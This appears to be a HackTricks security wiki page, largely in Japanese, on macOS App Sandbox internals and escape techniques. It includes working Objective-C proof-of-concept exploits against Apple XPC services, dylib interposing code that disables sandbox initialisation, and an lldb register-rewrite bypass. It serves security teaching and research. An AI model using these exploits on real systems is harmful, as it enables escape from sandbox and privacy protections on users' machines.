# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox loading process

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>画像は <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a> からのものです。</p></figcaption></figure>

前の画像では、**アプリケーションが権限 **`com.apple.security.app-sandbox`** を持っているときに、サンドボックスが**どのように読み込まれるかを観察できます。

コンパイラは `/usr/lib/libSystem.B.dylib` をバイナリにリンクします。

次に、**`libSystem.B`** は他のいくつかの関数を呼び出し、**`xpc_pipe_routine`** がアプリの権限を **`securityd`** に送信します。Securitydはプロセスがサンドボックス内で隔離されるべきかどうかを確認し、そうであれば隔離されます。\
最後に、サンドボックスは **`__sandbox_ms`** への呼び出しでアクティブ化され、これが **`__mac_syscall`** を呼び出します。

## Possible Bypasses

### Bypassing quarantine attribute

**サンドボックス化されたプロセスによって作成されたファイル** には、サンドボックスからの脱出を防ぐために **隔離属性** が追加されます。しかし、もしあなたが **隔離属性なしで `.app` フォルダを作成することができれば**、アプリバンドルのバイナリを **`/bin/bash`** にポイントさせ、**plist** にいくつかの環境変数を追加して **`open`** を悪用し、**新しいアプリをサンドボックスなしで起動する** ことができます。

これは [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)** で行われたことです。**

> [!CAUTION]
> したがって、現時点では、**隔離属性なしで `.app` で終わる名前のフォルダを作成することができる** なら、サンドボックスから脱出できます。なぜなら、macOSは **`.app` フォルダ** と **メイン実行可能ファイル** の **隔離** 属性のみを **チェック** するからです（そして、私たちはメイン実行可能ファイルを **`/bin/bash`** にポイントさせます）。
>
> すでに実行を許可された .app バンドル（実行を許可されたフラグが付いた隔離 xttrを持つ）も悪用できる可能性があります... ただし、今は **`.app`** バンドル内に書き込むことはできません。なぜなら、サンドボックス内では特権のある TCC 権限を持っていないからです（サンドボックス内では持っていません）。

### Abusing Open functionality

[**Wordサンドボックスバイパスの最後の例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) では、**`open`** CLI 機能がサンドボックスをバイパスするために悪用される様子が確認できます。

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

アプリケーションが **サンドボックス化されることを意図している** (`com.apple.security.app-sandbox`) 場合でも、例えば **LaunchAgent** (`~/Library/LaunchAgents`) から実行されるとサンドボックスをバイパスすることが可能です。\
[**この投稿**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) で説明されているように、サンドボックス化されたアプリケーションで永続性を得たい場合、LaunchAgent として自動的に実行されるようにし、DyLib 環境変数を介して悪意のあるコードを注入することができます。

### Abusing Auto Start Locations

サンドボックス化されたプロセスが **後でサンドボックスなしのアプリケーションがバイナリを実行する場所に** 書き込むことができれば、**そこにバイナリを置くだけで** 脱出できます。この種の場所の良い例は `~/Library/LaunchAgents` や `/System/Library/LaunchDaemons` です。

これには **2ステップ** が必要になる場合があります：**より許可されたサンドボックス** (`file-read*`, `file-write*`) を持つプロセスを実行して、実際に **サンドボックスなしで実行される場所に書き込む** コードを実行します。

**自動起動場所** に関するこのページを確認してください：

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing other processes

サンドボックスプロセスから **他のプロセスを妥協する** ことができれば、より制限の少ないサンドボックス（または全くない）に脱出することができます：

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Available System and User Mach services

サンドボックスは、プロファイル `application.sb` で定義された特定の **Machサービス** と通信することも許可します。これらのサービスの1つを **悪用** できれば、**サンドボックスから脱出** できるかもしれません。

[この書き込み](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) に示されているように、Machサービスに関する情報は `/System/Library/xpc/launchd.plist` に保存されています。`<string>System</string>` と `<string>User</string>` をそのファイル内で検索することで、すべてのシステムおよびユーザMachサービスを見つけることができます。

さらに、`bootstrap_look_up` を呼び出すことで、サンドボックス化されたアプリケーションに利用可能なMachサービスがあるかどうかを確認することができます。
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### 利用可能なPID Machサービス

これらのMachサービスは、最初にこの[サンドボックスからの脱出に利用されました](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)。その時点で、**アプリケーションとそのフレームワークによって必要とされるすべてのXPCサービス**がアプリのPIDドメイン内で表示されていました（これらは`ServiceType`が`Application`のMachサービスです）。

**PIDドメインXPCサービスに連絡するためには**、アプリ内で次のような行を使って登録するだけで済みます：
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
さらに、`System/Library/xpc/launchd.plist` 内で `<string>Application</string>` を検索することで、すべての **Application** Mach サービスを見つけることができます。

有効な xpc サービスを見つける別の方法は、次の場所を確認することです：
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
この技術を悪用したいくつかの例は[**元のレポート**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)に見つけることができますが、以下は要約された例です。

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

このサービスは、常に`YES`を返すことですべてのXPC接続を許可し、メソッド`runTask:arguments:withReply:`は任意のコマンドを任意のパラメータで実行します。

このエクスプロイトは「非常に簡単でした」:
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

このXPCサービスは、常にYESを返すことで、すべてのクライアントを許可し、メソッド`createZipAtPath:hourThreshold:withReply:`は、圧縮するフォルダのパスを指定することを基本的に許可しました。そして、それはZIPファイルに圧縮されます。

したがって、偽のアプリフォルダ構造を生成し、それを圧縮し、次に解凍して実行することで、サンドボックスを脱出することが可能です。新しいファイルには隔離属性がないためです。

エクスプロイトは：
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

このXPCサービスは、`extendAccessToURL:completion:`メソッドを介して、任意のURLに対する読み取りおよび書き込みアクセスをXPCクライアントに提供することを可能にします。このXPCサービスにはFDAがあるため、これらの権限を悪用してTCCを完全にバイパスすることが可能です。

エクスプロイトは：
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### 静的コンパイルと動的リンク

[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、Sandboxをバイパスする2つの方法が発見されました。Sandboxは、**libSystem**ライブラリがロードされるときにユーザーランドから適用されます。バイナリがそれをロードしないことができれば、Sandboxに入ることはありません：

- バイナリが**完全に静的にコンパイルされている**場合、そのライブラリをロードすることを避けることができます。
- **バイナリがライブラリをロードする必要がない**場合（リンカーもlibSystemにあるため）、libSystemをロードする必要はありません。

### シェルコード

**シェルコード**でさえ、ARM64では`libSystem.dylib`にリンクする必要があることに注意してください：
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 継承されない制限

**[この書き込みのボーナス](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** で説明されているように、サンドボックスの制限は次のようになります:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
新しいプロセスが例えば実行することでバイパスできます:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
しかし、もちろん、この新しいプロセスは親プロセスから権限や特権を継承しません。

### 権限

特定の**権限**を持つアプリケーションの場合、いくつかの**アクション**が**サンドボックスによって許可される**可能性があることに注意してください。
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### インターポスティングバイパス

**インターポスティング**に関する詳細は以下を参照してください:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### サンドボックスを防ぐために `_libsecinit_initializer` をインターポストする
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` でサンドボックスを防ぐ
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldbを使用したSandboxのデバッグとバイパス

サンドボックス化されるべきアプリケーションをコンパイルしましょう：

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

次にアプリをコンパイルします:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> アプリは **`~/Desktop/del.txt`** ファイルを **読み取ろう** としますが、**Sandboxはそれを許可しません**。\
> Sandboxがバイパスされると読み取れるように、そこにファイルを作成してください:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

アプリケーションをデバッグして、Sandboxがいつ読み込まれるかを見てみましょう:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **サンドボックスをバイパスしても、TCC** はユーザーにデスクトップからファイルを読み取るプロセスを許可するかどうか尋ねます

## 参考文献

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
